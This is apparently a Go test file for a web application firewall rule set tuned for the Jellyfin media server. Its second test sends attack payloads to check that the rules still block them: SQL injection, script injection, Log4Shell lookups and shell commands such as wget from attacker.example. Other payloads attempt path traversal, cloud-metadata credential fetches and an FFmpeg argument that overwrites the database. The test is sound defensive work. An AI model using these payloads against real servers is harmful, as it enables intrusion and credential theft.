					{"GET", "/Studios/" + n + "/Images/Thumb?quality=90", "", "", true, c},
					{"GET", "/persons/" + n + "/images/primary/0?maxheight=300", "", "", true, g.client(jfRoku)},
				} {
					if status := jfSend(t, plain, r); status != http.StatusOK {
						t.Errorf("%s %s (%s): %d", r.method, r.path, r.client.userAgent, status)
					}
				}
			}
			for _, img := range jfImages {
				item, c, provider := g.id(), g.client(g.r.IntN(jfClients)), uriComponent(img.provider)
				for _, r := range []jfRequest{
					{"GET", "/Items/" + item + "/RemoteImages?type=Primary&startIndex=0&limit=30&IncludeAllLanguages=false&ProviderName=" + provider, "", "", false, c},
					{"POST", "/Items/" + item + "/RemoteImages/Download?Type=" + g.pick("Primary", "Backdrop", "Logo", "Thumb") +
						"&ImageUrl=" + uriComponent(img.url) + "&ProviderName=" + provider, "", "", false, c},
					{"POST", "/Items/RemoteSearch/Apply/" + item + "?ReplaceAllImages=true", "application/json", vwJSON(map[string]any{"Name": "Lanternfall",
						"ProviderIds": map[string]any{"Tmdb": "84512"}, "ProductionYear": 2019, "ImageUrl": img.url, "SearchProviderName": img.provider}), false, c},
				} {
					if status := jfSend(t, plain, r); status != http.StatusOK {
						t.Errorf("%s %s %s (%s): %d", r.method, r.path, r.body, r.client.userAgent, status)
					}
				}
			}
			// What the web client's editors send: a picture, subtitles or
			// lyrics from the computer, one picture past the profile's body
			// limit, and Identify's search and the match it takes, with the
			// plot summary and, for an album, the artists. They draw from a
			// generator of their own, so the requests below are drawn as
			// before.
			const js = "application/json"
			u := jf{vw{rand.New(rand.NewPCG(uint64(pl), 3))}}
			web, kt, item := u.client(0), u.client(jfClients-1), u.id()
			artist := func(name string) map[string]any {
				return map[string]any{"Name": name, "ProviderIds": map[string]any{"MusicBrainzArtist": u.uuid()}, "Overview": nil,
					"ImageUrl": nil, "SearchProviderName": nil, "AlbumArtist": nil, "Artists": []any{}}
			}
			subtitle := func(file, format string) string {
				return vwJSON(map[string]any{"Data": base64.StdEncoding.EncodeToString([]byte(file)), "Language": "eng", "Format": format,
					"IsForced": false, "IsHearingImpaired": u.r.IntN(2) == 0})
			}
			rs := []jfRequest{
				{"POST", "/Items/" + item + "/Images/Primary", "image/jpeg", u.picture(48 << 10), false, web},
				{"POST", "/Items/" + item + "/Images/Backdrop/1", "image/png", u.picture(10 << 20), false, web},
				{"POST", "/Items/" + item + "/Images/Logo", "image/svg+xml", u.picture(6 << 10), false, web},
				{"POST", "/Users/" + u.id() + "/Images/Primary", "image/webp", u.picture(24 << 10), false, web},
				{"POST", "/UserImage?userId=" + u.id(), "image/gif", u.picture(12 << 10), false, kt},
				{"POST", "/Branding/Splashscreen", "image/avif", u.picture(64 << 10), false, web},
				{"POST", "/Videos/" + item + "/Subtitles", js, subtitle(jfSRT, "srt"), false, web},
				{"POST", "/Videos/" + item + "/Subtitles", js, subtitle(jfASS, "ass"), false, web},
				{"POST", "/Audio/" + item + "/Lyrics?fileName=" + uriComponent("01 - Lanterns at Low Tide (Live).lrc"), "text/plain", jfLRC, false, web},
				{"POST", "/Items/RemoteSearch/Apply/" + item, js, vwJSON(map[string]any{"Name": "Lanterns at Low Tide",
					"ProviderIds": map[string]any{"MusicBrainzAlbum": u.uuid(), "MusicBrainzReleaseGroup": u.uuid()}, "ProductionYear": 2017,
					"PremiereDate": "2017-05-12T00:00:00.0000000Z", "SearchProviderName": "MusicBrainz", "Overview": nil,
					"AlbumArtist": artist("Jo & the Kite-Liners"), "Artists": []any{artist("Jo & the Kite-Liners"), artist("Marigold Static")}}), false, web},
			}
			for _, kind := range []string{"Movie", "Series", "Person", "MusicAlbum"} {
				rs = append(rs, jfRequest{"POST", "/Items/RemoteSearch/" + kind, js, vwJSON(map[string]any{"SearchInfo": map[string]any{
					"ProviderIds": map[string]any{"Tmdb": "", "Imdb": ""}, "Name": u.pick("Hélène Marchetti", "Lanterns at Low Tide", "The Night Ferry"),
					"Year": 2019}, "ItemId": u.id()}), false, web})
			}
			for _, overview := range jfOverviews {
				rs = append(rs, jfRequest{"POST", "/Items/RemoteSearch/Apply/" + u.id() + "?ReplaceAllImages=" + u.pick("true", "false"), js,
					vwJSON(map[string]any{"Name": "The Night Ferry", "ProviderIds": map[string]any{"Tmdb": "84512", "Imdb": "tt0123456"},
						"ProductionYear": 2019, "PremiereDate": "2019-04-05T00:00:00.0000000Z",
						"ImageUrl": "https://image.example.org/t/p/original/7xdcg2lMLzgeonyLGcTJFiz4soC.jpg", "SearchProviderName": "TheMovieDb",
						"Overview": overview, "Artists": []any{}}), false, web})
			}
			for _, r := range rs {
				if status := jfSend(t, plain, r); status != http.StatusOK {
					t.Errorf("%s %s %.80q (%s): %d", r.method, r.path, r.body, r.client.userAgent, status)
				}
			}
			for i := range 2 * jfClients {
				for _, r := range g.requests(g.client(i % jfClients)) {
					if status := jfSend(t, plain, r); status != http.StatusOK {
						t.Errorf("%s %s (%s): %d", r.method, r.path, r.client.userAgent, status)
					}
				}
			}
			if t.Failed() {
				t.Logf("events:\n%s", events(out))
			}
		})
	}
}

// An attack CRS alone refuses at a level is refused with the set loaded
// too, whether it sits in an argument the clients fill with ids and lists
// or comes in the Authorization header. Text, which the set reads as
// paranoia 2 does, keeps what CRS alone refuses there, and a plot summary
// Identify sends back what CRS alone refuses at paranoia 1.
func TestTheJellyfinSetKeepsTheAttacks(t *testing.T) {
	t.Parallel()
	g := jf{vw{rand.New(rand.NewPCG(7, 8))}}
	c := g.client(0)
	kt := g.client(jfClients - 1)
	ua := func(userAgent string) jfClient {
		k := kt
		k.userAgent = userAgent
		return k
	}
	const js = "application/json"
	progress := func(field, value string) string {
		p := g.progress(c)
		p[field] = value
		return vwJSON(p)
	}
	roku := g.client(jfRoku)
	device := func(field, value string) string {
		p := g.rokuProfile(jfRokuNames[0], jfRokuModels[0])
		p[field] = value
		return vwJSON(map[string]any{"DeviceProfile": p})
	}
	inText := []jfRequest{
		{"GET", "/Items?searchTerm=" + url.QueryEscape("x' UNION SELECT Password FROM Users--") + "&recursive=true", "", "", false, c},
		{"GET", "/Items?searchTerm=" + url.QueryEscape("<script>alert(document.cookie)</script>"), "", "", false, c},
		{"GET", "/Items?searchTerm=" + url.QueryEscape("; cat /etc/passwd"), "", "", false, c},
		{"GET", "/Items?genres=" + url.QueryEscape("${jndi:ldap://attacker.example/a}"), "", "", false, c},
		{"POST", "/Playlists", js, vwJSON(map[string]any{"Name": "<script>alert(1)</script>", "Ids": []string{g.id()}}), false, c},
		{"POST", "/Users/AuthenticateByName", js, vwJSON(map[string]any{"Username": "admin' OR 1=1--", "Pw": "x"}), false, c},
		{"POST", "/Sessions/Capabilities/Full", js, device("FriendlyName", "<script>alert(1)</script>"), false, roku},
		{"POST", "/Items/" + g.id() + "/PlaybackInfo", js, device("ModelDescription", "Type: TV; cat /etc/passwd"), false, roku},
		{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" +
			uriComponent("http://169.254.169.254/latest/meta-data/iam/security-credentials/") + "&ProviderName=TheMovieDb", "", "", false, c},
		{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" +
			uriComponent("https://image.example.org/t/p/original/x.jpg' UNION SELECT Password FROM Users--"), "", "", false, c},
		{"GET", "/Items/" + g.id() + "/RemoteImages?type=Primary&ProviderName=" + uriComponent("<script>alert(1)</script>"), "", "", false, c},
		{"POST", "/Items/RemoteSearch/Apply/" + g.id(), js, vwJSON(map[string]any{"Name": "x",
			"AlbumArtist": map[string]any{"Name": "x' UNION SELECT Password FROM Users--"}}), false, c},
		{"POST", "/Audio/" + g.id() + "/Lyrics?fileName=" + uriComponent("../../../../etc/passwd"), "text/plain", jfLRC, false, c},
	}
	apply := func(body map[string]any) jfRequest {
		return jfRequest{"POST", "/Items/RemoteSearch/Apply/" + g.id(), js, vwJSON(body), false, c}
	}
	inProse := []jfRequest{
		apply(map[string]any{"Name": "x", "Overview": "<script>alert(document.cookie)</script>"}),
		apply(map[string]any{"Name": "x", "Overview": "x' UNION SELECT Password FROM Users--"}),
		apply(map[string]any{"Name": "x", "Overview": "Lost at sea; cat /etc/passwd"}),
		apply(map[string]any{"Name": "x", "AlbumArtist": map[string]any{"Name": "x", "Overview": "${jndi:ldap://attacker.example/a}"}}),
	}
	attacks := []jfRequest{
		{"GET", "/Items?userId=" + g.id() + "&fields=" + url.QueryEscape("Overview' OR '1'='1") + "&recursive=true", "", "", false, c},
		{"GET", "/Items/" + g.id() + "/Images/Primary?tag=" + url.QueryEscape("<svg onload=alert(1)>"), "", "", true, c},
		{"GET", "/videos/" + g.id() + "/master.m3u8?DeviceId=" + url.QueryEscape("../../../../etc/passwd") + "&api_key=" + g.id(), "", "", true, c},
		{"GET", "/Shows/NextUp?nextUpDateCutoff=" + url.QueryEscape("2025-09-29' AND SLEEP(5)--"), "", "", false, c},
		{"POST", "/Sessions/Playing/Progress", js, progress("ItemId", "1; wget http://attacker.example/x.sh"), false, c},
		{"POST", "/Sessions/Playing/Progress", js, progress("PlaySessionId", "<img src=x onerror=alert(1)>"), false, c},
		{"POST", "/Items/RemoteSearch/Apply/" + g.id(), js, vwJSON(map[string]any{"Name": "x", "ImageUrl": "file:///etc/passwd"}), false, c},
		// The check for links off the site skips only a picture's one web
		// address, on a host with a name, where a picture is taken.
		{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" + uriComponent("ftp://attacker.example/x.jpg"), "", "", false, c},
		{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" + uriComponent("http://intranet/x.jpg"), "", "", false, c},
		{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" + uriComponent("https://image.example.org/t/p/original/x.jpg") +
			"&ImageUrl=" + uriComponent("http://attacker.example/x.txt"), "", "", false, c},
		{"POST", "/Items/RemoteSearch/Apply/" + g.id(), js, vwJSON(map[string]any{"Name": "x", "ImageUrl": "https://image.example.org/t/p/original/x.jpg",
			"imageUrl": "http://attacker.example/x.txt"}), false, c},
		{"POST", "/Items/" + g.id() + "/Refresh?ImageUrl=" + uriComponent("https://attacker.example/x.txt"), "", "", false, c},
		{"GET", "/System/Info", "", "", false, jfClient{c.userAgent,
			`MediaBrowser Client="Jellyfin Web", Device="<script>alert(1)</script>", DeviceId="x", Version="1", Token="` + g.id() + `"`, c.deviceID, true, false, "", false}},
		// A command after the client's name. After a closing bracket only
		// the check the set lifts off a plain User-Agent reads it.
		{"GET", "/UserViews?userId=" + g.uuid(), "", "", false, ua(kt.userAgent + ";wget")},
		{"GET", "/UserViews?userId=" + g.uuid(), "", "", false, ua(kt.userAgent + " `id`")},
		// Without a character only the rules that count them see. Where
		// the clients send ids and lists these are marked, and read as CRS
		// reads them.
		{"GET", "/Items?fields=" + url.QueryEscape("1 or 1") + "&recursive=true", "", "", false, c},
		// A list takes a space after a comma and nowhere else, where
		// FFmpeg's arguments would need one.
		{"GET", "/videos/" + g.id() + "/stream?static=false&VideoCodec=" + uriComponent("h264, hevc -f mp4 -y jellyfin.db"), "", "", false, roku},
		{"GET", "/Items?fields=" + url.QueryEscape("char(65)"), "", "", false, c},
		{"GET", "/Items?parentId=" + url.QueryEscape("a);(b"), "", "", false, c},
		// Only an argument's name id is not taken for the command.
		{"GET", "/Devices/Info?id=id", "", "", false, c},
		{"GET", "/Devices/Info?id=" + c.deviceID + "&ls=1", "", "", false, c},
		{"POST", "/Sessions/Playing/Progress", js, progress("PlaySessionId", "((((((((("), false, c},
		{"POST", "/DisplayPreferences/usersettings?client=emby", js, vwJSON(map[string]any{"CustomPrefs": map[string]any{"x": `{"a":"1 or 1"}`}}), false, c},
		// Outside the arguments the set knows, text is read as CRS reads it.
		{"GET", "/Items?userId=" + g.id() + "&overview=" + url.QueryEscape("It's a trap: 'quoted' -- (really)!"), "", "", false, c},
		// A command in the path is read where no name goes, and a name is
		// read for everything but commands.
		{"GET", "/Items/" + uriComponent("x&&whoami") + "/Images/Primary", "", "", true, c},
		{"GET", "/Persons/" + uriComponent("<script>alert(1)</script>") + "/Images/Primary", "", "", true, c},
		// A body goes unread only as a picture where pictures go up, as
		// lyrics where lyrics go up, and as one subtitle file in base64.
		{"POST", "/Items/" + g.id() + "/Images/Primary", "application/x-www-form-urlencoded", "a=" + url.QueryEscape("<script>alert(1)</script>"), false, c},
		{"POST", "/Items/" + g.id(), "image/png", g.picture(64), false, c},
		{"POST", "/Audio/" + g.id() + "/Lyrics?fileName=x.lrc", js, vwJSON(map[string]any{"Lyrics": "<script>alert(1)</script>"}), false, c},
		{"POST", "/Videos/" + g.id() + "/Subtitles", js, vwJSON(map[string]any{"Data": "<script>alert(1)</script>", "Format": "srt"}), false, c},
		{"POST", "/Videos/" + g.id() + "/Subtitles", js, vwJSON(map[string]any{"Data": base64.StdEncoding.EncodeToString([]byte(jfSRT)),
			"data": "x' UNION SELECT Password FROM Users--", "Format": "srt"}), false, c},
	}
	for pl := 1; pl <= 4; pl++ {
		t.Run(fmt.Sprintf("paranoia %d", pl), func(t *testing.T) {
			t.Parallel()
			bare, _ := watchSite(t, pl, false)
			bareText, bareProse := bare, bare
			if pl > 2 {
				bareText, _ = watchSite(t, 2, false)
			}
			if pl > 1 {
				bareProse, _ = watchSite(t, 1, false)
			}
			plain, out := watchSite(t, pl, true)
			refused := 0
			check := func(bare string, rs []jfRequest) {
				for _, r := range rs {
					if jfSend(t, bare, r) != http.StatusForbidden {
						continue
					}
					refused++
					if status := jfSend(t, plain, r); status != http.StatusForbidden {
						t.Errorf("%s %s with %.80q (%s): %d with the set, 403 without", r.method, r.path, r.body+r.client.auth, r.client.userAgent, status)
					}
				}
			}
			check(bare, attacks)
			check(bareText, inText)
			check(bareProse, inProse)
			segment := jfRequest{"GET", "/videos/" + g.id() + "/hls1/main/1.ts?MediaSourceId=" + g.id(), "", "", false, roku}
			// Only the header check reads this one.
			command := map[string]string{"Cmcd-Request": `mtp=81200,su,bl=0,nor="1.ts?a=$(id)"`}
			if jfSendWith(t, bare, segment, command) == http.StatusForbidden {
				refused++
				if status := jfSendWith(t, plain, segment, command); status != http.StatusForbidden {
					t.Errorf("a command in a CMCD header: %d with the set, 403 without", status)
				}
			}
			if total := len(attacks) + len(inText) + len(inProse); refused < total/2 {
				t.Errorf("CRS alone refused only %d of %d attacks", refused, total)
			}
			if t.Failed() {
				t.Logf("events:\n%s", events(out))
			}
		})
	}
}
